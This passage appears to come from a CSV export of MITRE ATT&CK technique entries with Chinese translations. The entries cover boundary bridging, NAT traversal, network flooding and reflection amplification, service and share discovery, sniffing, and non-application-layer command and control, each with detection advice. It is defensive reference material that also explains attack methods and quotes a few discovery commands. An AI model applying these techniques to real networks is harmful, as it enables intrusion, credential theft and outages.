When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",https://attack.mitre.org/techniques/T1599,19 October 2020,05 May 2022,1.1,Defense Evasion,"Consider monitoring network traffic on both interfaces of border network devices with out-of-band packet capture or network flow data, using a different device than the one in question.  Look for traffic that should be prohibited by the intended network traffic policy enforcement for the border network device.

Monitor the border network device’s configuration to validate that the policy enforcement sections are what was intended.  Look for rules that are less restrictive, or that allow specific traffic types that were not previously authorized.",Network,"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,"Firewall, System Access Controls",,,,,,,,",(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: NIST 800-63-3),(Citation: Cisco IOS Software Integrity Assurance - TACACS)",网络边界桥接,攻击者可以通过破坏外围网络设备或负责网络分段的内部设备来桥接网络边界。破坏这些设备可能使攻击者能够绕过对流量路由的限制，否则这些限制会分隔受信任和不受信任的网络。路由器和防火墙等设备可用于在受信任和不受信任的网络之间创建边界。他们通过限制流量类型以强制执行组织策略来实现这一点，以尝试降低此类连接中固有的风险。可以通过禁止 IP 地址、第 4 层协议端口或通过深度数据包检测来识别应用程序来实现流量限制。为了与网络的其余部分一起参与，这些设备可以是直接可寻址或透明的，但它们的操作模式与攻击者在受到攻击时如何绕过它们无关。当攻击者控制了这样的边界设备时，他们可以绕过其策略执行，将通常禁止的流量毫无阻碍地穿过两个分离网络之间的信任边界。通过在设备上获得足够的权限，攻击者可以重新配置设备以允许他们想要的流量，从而允许他们通过[多跳代理]进一步实现命令和控制等目标（https://attack.mitre.org /techniques/T1090/003) 或通过 [Traffic Duplication] (https://attack.mitre.org/techniques/T1020/001) 泄露数据。攻击者也可能针对负责网络分段的内部设备，并与 [Internal Proxy] (https://attack.mitre.org/techniques/T1090/001) 一起滥用这些设备以实现相同的目标。（引用：Kaspersky ThreatNeedle 2021 年 2 月) 在边界设备将两个独立的组织分开的情况下，攻击者还可以促进横向移动到新的受害环境中。
T1599.001,Network Boundary Bridging: Network Address Translation Traversal,"Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.

Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)

When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  

Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",https://attack.mitre.org/techniques/T1599/001,19 October 2020,21 October 2020,1.0,Defense Evasion,"Consider monitoring network traffic on both interfaces of border network devices.  Compare packets transmitted by the device between networks to look for signs of NAT being implemented.  Packets which have their IP addresses changed should still have the same size and contents in the data encapsulated beyond Layer 3.  In some cases, Port Address Translation (PAT) may also be used by an adversary.

Monitor the border network device’s configuration to determine if any unintended NAT rules have been added without authorization.",Network,"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1599,,,Administrator,,,,,,",(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: NIST 800-63-3),(Citation: Cisco IOS Software Integrity Assurance - TACACS)",网络边界桥接：网络地址转换遍历,攻击者可以通过修改网络设备的网络地址转换 (NAT) 配置来桥接网络边界。对 NAT 的恶意修改可能使攻击者能够绕过对流量路由的限制，否则这些限制会分隔受信任和不受信任的网络。将多个网络连接在一起的网络设备（例如路由器和防火墙）可能会在网络之间传递数据包的过程中实现 NAT。执行 NAT 时，网络设备将重写 IP 地址标头的源地址和/或目标地址。某些网络设计需要 NAT 以使数据包通过边界设备。一个典型的例子是内部网络使用非 Internet 可路由地址的环境。（引用：RFC1918）当对手获得网络边界设备的控制权时，他们可以利用现有的 NAT 配置在两个分离的网络之间发送流量，或者他们可以实现自己设计的 NAT 配置。对于需要 NAT 才能运行的网络设计，这使攻击者能够克服固有的路由限制，这些限制通常会阻止他们访问边界设备后面的受保护系统。在不需要 NAT 的网络设计的情况下，攻击者可以使用地址转换来掩盖他们的活动，因为更改穿过网络边界设备的数据包的地址会使监控数据传输对防御者来说更具挑战性。攻击者可能使用 [补丁系统映像](https://attack.mitre.org/techniques/T1601/001) 更改网络设备的操作系统，实施他们自己的自定义 NAT 机制以进一步掩盖他们的活动
T1498,Network Denial of Service,"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)

A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).

To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.

Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.

For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",https://attack.mitre.org/techniques/T1498,17 April 2019,25 March 2022,1.1,Impact,"Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an Network DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.","Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Network Traffic: Network Traffic Flow, Sensor Health: Host Status",False,,,"Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",,,,,Availability,,"(Citation: Unit 42 Lucifer June 2020),(Citation: US District Court Indictment GRU Oct 2018),(Citation: CERT-EU DDoS March 2017)",网络拒绝服务,攻击者可能会执行网络拒绝服务 (DoS) 攻击，以降低或阻止目标资源对用户的可用性。网络 DoS 可以通过耗尽服务所依赖的网络带宽来执行。示例资源包括特定网站、电子邮件服务、DNS 和基于 Web 的应用程序。已观察到攻击者出于政治目的进行网络 DoS 攻击（引文：FireEye OpPoisonedHandover 2016 年 2 月）并支持其他恶意活动，包括分心（引文：FSISAC FraudNetDoS 2012 年 9 月）、黑客行为和勒索。（引文：赛门铁克 DDoS 2014 年 10 月）当网络连接到系统的带宽容量由于指向资源或资源所依赖的网络连接和网络设备的恶意流量量而耗尽时，就会发生网络 DoS。例如，攻击者可能会将 10Gbps 的流量发送到由具有 1Gbps 连接到互联网的网络托管的服务器。这种流量可以由单个系统或分布在互联网上的多个系统生成，这通常称为分布式 DoS (DDoS)。执行网络 DoS 攻击的几个方面适用于多种方法，包括 IP 地址欺骗和僵尸网络。攻击者可能会使用攻击系统的原始 IP 地址，或欺骗源 IP 地址，以使攻击流量更难以追溯到攻击系统或启用反射。这可以通过降低或消除网络防御设备上源地址过滤的有效性来增加防御者防御攻击的难度。对于直接针对托管系统的 DoS 攻击，请参阅 [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499)。
T1498.001,Network Denial of Service: Direct Network Flood,"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.

Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",https://attack.mitre.org/techniques/T1498/001,02 March 2020,19 April 2022,1.3,Impact,"Detection of a network flood can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a network flood event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1498,,,,,,"CAPEC-125, CAPEC-486",Availability,,",(Citation: CERT-EU DDoS March 2017)",网络拒绝服务：直接网络泛滥,攻击者可能会尝试通过直接向目标发送大量网络流量来引发拒绝服务 (DoS)。这种 DoS 攻击还可能降低目标系统和网络的可用性和功能。 [直接网络泛滥](https://attack.mitre.org/techniques/T1498/001) 是指使用一个或多个系统向目标服务的网络发送大量网络数据包。几乎任何网络协议都可以用于泛洪。 UDP 或 ICMP 等无状态协议是常用的，但也可以使用 TCP 等有状态协议。僵尸网络通常用于对网络和服务进行网络泛洪攻击。大型僵尸网络可以从遍布全球互联网的系统中产生大量流量。攻击者可能有资源来构建和控制他们自己的僵尸网络基础设施，或者可能会在现有的僵尸网络上租用时间来进行攻击。在分布式 DoS (DDoS) 的一些最糟糕的情况下，使用如此多的系统来生成洪水，每个系统只需要发送少量流量即可产生足够的流量来使目标网络饱和。在这种情况下，将 DDoS 流量与合法客户端区分开来变得异常困难。僵尸网络已被用于一些最引人注目的 DDoS 洪水攻击，例如 2012 年针对美国主要银行的一系列事件。（引用：USNYAG 伊朗僵尸网络 2016 年 3 月）
T1498.002,Network Denial of Service: Reflection Amplification,"Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.

Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)",https://attack.mitre.org/techniques/T1498/002,02 March 2020,25 March 2022,1.3,Impact,"Detection of reflection amplification can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a reflection amplification DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1498,,,,,,CAPEC-490,Availability,,",(Citation: CERT-EU DDoS March 2017)",网络拒绝服务：反射放大,"攻击者可能会试图通过向目标反射大量网络流量来引发拒绝服务 (DoS)。这种类型的网络拒绝服务利用第三方服务器中介来托管并将响应给定的欺骗源 IP 地址。这种第三方服务器通常称为反射器。攻击者通过将数据包发送到具有受害者欺骗地址的反射器来完成反射攻击。与直接网络洪水类似，可以使用多个系统进行攻击，或者可以使用僵尸网络。同样，可以使用一个或多个反射器将流量集中在目标上。（引用：Cloudflare ReflectionDoS 2017 年 5 月）这种网络 DoS 攻击还可能降低目标系统和网络的可用性和功能。反射攻击通常利用响应大于请求的协议来放大其流量，通常称为反射放大攻击。攻击者可能会产生比发送到放大器的请求大几个数量级的攻击流量。这种增加的程度将取决于许多变量，例如所讨论的协议、使用的技术以及实际产生攻击量放大的放大服务器。启用反射放大洪水的两个著名协议是 DNS（引文：Cloudflare DNSamplficationDoS）和 NTP（引文：Cloudflare NTPamplifciationDoS），尽管已经记录了在野外使用其他几个协议。（引文：Arbor AnnualDoSreport Jan 2018）特别是， memcache 协议证明自己是一个强大的协议，其放大大小高达请求数据包的 51,200 倍。（引用：Cloudflare Memcrashed Feb 2018）"
T1046,Network Service Discovery,"Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   

Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.

Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)",https://attack.mitre.org/techniques/T1046,31 May 2017,20 April 2022,3.0,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.","Containers, IaaS, Linux, Network, Windows, macOS","Cloud Service: Cloud Service Enumeration, Command: Command Execution, Network Traffic: Network Traffic Flow",False,,,Praetorian,,,,CAPEC-300,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Peirates GitHub),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Group IB Cobalt Aug 2017),(Citation: Debian nbtscan Nov 2019),(Citation: TrendMicro TropicTrooper 2015),(Citation: SecTools nbtscan June 2003),(Citation: Talos Cobalt Strike September 2020),(Citation: Github PowerShell Empire),(Citation: FoxIT Wocao December 2019),(Citation: FireEye APT39 Jan 2019),(Citation: Talos Rocke August 2018),(Citation: ESET Hermetic Wizard March 2022),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Unit 42 Lucifer June 2020),(Citation: GitHub Pupy),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Symantec Suckfly May 2016),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: ESET InvisiMole June 2020),(Citation: BitDefender Chafer May 2020),(Citation: ESET Industroyer),(Citation: FireEye APT41 Aug 2019),(Citation: Symantec Palmerworm Sep 2020),(Citation: FireEye Periscope March 2018),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Antiy CERT Ramsay April 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Unit 42 Hildegard Malware),(Citation: Dell TG-3390),(Citation: Unit42 Emissary Panda May 2019),(Citation: Anomali Rocke March 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Talos ZxShell Oct 2014),(Citation: cobaltstrike manual),(Citation: Palo Alto Black-T October 2020),(Citation: Github Koadic),(Citation: Invincea XTunnel),(Citation: Bitdefender Naikon April 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Gigamon Berserk Bear October 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Securelist BlackEnergy Nov 2014),(Citation: GitHub PoshC2),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: CERT-FR PYSA April 2020),(Citation: NCC Group Chimera January 2021),(Citation: FireEye FIN6 April 2016),(Citation: Cybereason Cobalt Kitty 2017),(Citation: SANS Conficker),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: BlackBerry CostaRicto November 2020),(Citation: Symantec Leafminer July 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: Baumgartner Naikon 2015),(Citation: ANSSI Sandworm January 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Eset Ramsay May 2020),",网络服务发现,攻击者可能会尝试获取在远程主机和本地网络基础设施设备上运行的服务列表，包括那些可能容易受到远程软件利用的服务。获取此信息的常用方法包括使用系统自带的工具进行端口和/或漏洞扫描。（引用：CISA AR21-126A FIVEHANDS 2021 年 5 月）在云环境中，攻击者可能会尝试发现在其他云主机上运行的服务。此外，如果云环境连接到本地环境，攻击者也可能能够识别在非云系统上运行的服务。在 macOS 环境中，攻击者可能会使用本机 Bonjour 应用程序来发现网络中其他 macOS 主机上运行的服务。 Bonjour mDNSResponder 守护程序自动注册并在网络上公布主机的注册服务。例如，攻击者可以使用 mDNS 查询（例如 <code>dns-sd -B _ssh._tcp .</code>）来查找广播 ssh 服务的其他系统。（引用：apple doco bonjour description）（引用：macOS APT 活动布拉德利）
T1135,Network Share Discovery,"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. 

File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",https://attack.mitre.org/techniques/T1135,14 December 2017,13 October 2021,3.1,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",False,,,Praetorian,User,,,CAPEC-643,,,"(Citation: Securelist DarkVishnya Dec 2018),(Citation: Crowdstrike Indrik November 2018),(Citation: Mandiant APT1),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: McAfee Cuba April 2021),(Citation: TrendMicro TropicTrooper 2015),(Citation: ESET Bad Rabbit),(Citation: Savill 1999),(Citation: Github PowerShell Empire),(Citation: CIRCL PlugX March 2013),(Citation: FoxIT Wocao December 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Symantec Sowbug Nov 2017),(Citation: CME Github September 2018),(Citation: NCC Group Team9 June 2020),(Citation: CarbonBlack Conti July 2020),(Citation: GitHub Pupy),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Group IB APT 41 June 2021),(Citation: ESET Trickbot Oct 2020),(Citation: BitDefender Chafer May 2020),(Citation: Symantec Buckeye),(Citation: Arxiv Avaddon Feb 2021),(Citation: ESET InvisiMole June 2018),(Citation: FireEye FiveHands April 2021),(Citation: Kaspersky QakBot September 2021),(Citation: FireEye APT41 Aug 2019),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: FireEye Periscope March 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Mcafee Clop Aug 2019),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: NCC Group Fivehands June 2021),(Citation: Talos Olympic Destroyer 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: TrendMicro Tonto Team October 2020),(Citation: Bitdefender Trickbot March 2020),(Citation: Github Koadic),(Citation: NTT Security Flagpro new December 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: NCC Group Chimera January 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Fortinet Diavol July 2021),(Citation: US-CERT TA18-074A),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Sentinel Labs WastedLocker July 2020),(Citation: Symantec Orangeworm April 2018),(Citation: Securelist Sofacy Feb 2018),(Citation: Eset Ramsay May 2020),(Citation: Microsoft Actinium February 2022),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Windows Anonymous Enumeration of SAM Accounts)",网络共享发现,攻击者可能会寻找在远程系统上共享的文件夹和驱动器，作为识别信息来源的一种手段，以作为收集的前兆，并识别横向移动感兴趣的潜在系统。网络通常包含共享的网络驱动器和文件夹，使用户能够通过网络访问各种系统上的文件目录。 Windows 网络上的文件共享通过 SMB 协议进行。 （引用：维基百科共享资源）（引用：TechNet 共享文件夹）[Net](https://attack.mitre.org/software/S0039) 可用于使用查询远程系统的可用共享驱动器查看 <code>net view \\\\remotesystem</code> 命令。它还可用于使用 <code>net share</code> 查询本地系统上的共享驱动器。对于 macOS，<code>sharing -l</code> 命令列出了用于 smb 服务的所有共享点。
T1040,Network Sniffing,"Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.

In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring) (Citation: GCP Packet Mirroring) (Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring) (Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic. (Citation: Rhino Security Labs AWS VPC Traffic Mirroring)",https://attack.mitre.org/techniques/T1040,31 May 2017,20 May 2022,1.3,"Credential Access, Discovery","Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.

In cloud-based environments, monitor for the creation of new traffic mirrors or modification of existing traffic mirrors.","IaaS, Linux, Network, Windows, macOS","Command: Command Execution, Process: Process Creation",False,,,"Oleg Kolesnikov, Securonix; Tiago Faria, 3CORESec",,,Network interface access and packet capture driver,CAPEC-158,,,"(Citation: Securelist DarkVishnya Dec 2018),(Citation: Debian nbtscan Nov 2019),(Citation: SecTools nbtscan June 2003),(Citation: Leonardo Turla Penquin May 2020),(Citation: Symantec Elfin Mar 2019),(Citation: Github PowerShell Empire),(Citation: MSTIC FoggyWeb September 2021),(Citation: Impacket Tools),(Citation: Kaspersky Turla Penquin December 2014),(Citation: CISA AA20-301A Kimsuky),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: FireEye APT28),(Citation: FireEye APT28 Hospitality Aug 2017),(Citation: ESET Telebots Dec 2016),(Citation: GitHub PoshC2),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: GitHub Responder),(Citation: FireEye MESSAGETAP October 2019),(Citation: Kaspersky Regin),",网络嗅探,攻击者可能会嗅探网络流量以捕获有关环境的信息，包括通过网络传递的身份验证材料。网络嗅探是指使用系统上的网络接口来监视或捕获通过有线或无线连接发送的信息。攻击者可能会将网络接口置于混杂模式以被动访问通过网络传输的数据，或使用跨端口捕获大量数据。通过这种技术捕获的数据可能包括用户凭据，尤其是那些通过不安全、未加密协议发送的凭据。名称服务解析中毒技术，例如 [LLMNR/NBT-NS 中毒和 SMB 中继](https://attack.mitre.org/techniques/T1557/001)，也可用于捕获网站、代理、和内部系统通过将流量重定向到对手。网络嗅探还可能揭示后续横向移动和/或防御规避活动所需的配置细节，例如运行服务、版本号和其他网络特征（例如 IP 地址、主机名、VLAN ID）。在基于云的环境中，攻击者可能仍然能够使用流量镜像服务来嗅探来自虚拟机的网络流量。例如，AWS Traffic Mirroring、GCP Packet Mirroring 和 Azure vTap 允许用户定义指定的实例来收集流量和指定的目标以将收集的流量发送到。（引文：AWS 流量镜像）（引文：GCP 数据包镜像）（引文： Azure 虚拟网络 TAP）通常，由于在负载均衡器级别使用 TLS 终止以减少加密和解密流量的压力，因此大部分流量将以明文形式出现。（引文：Rhino 安全实验室 AWS VPC 流量镜像）（引文: SpecterOps AWS 流量镜像）然后攻击者可以使用渗透技术，例如将数据传输到云帐户，以访问嗅探到的流量。 （引用：Rhino 安全实验室 AWS VPC 流量镜像）
T1095,Non-Application Layer Protocol,"Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",https://attack.mitre.org/techniques/T1095,31 May 2017,17 February 2022,2.1,Command and Control,"Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2) 

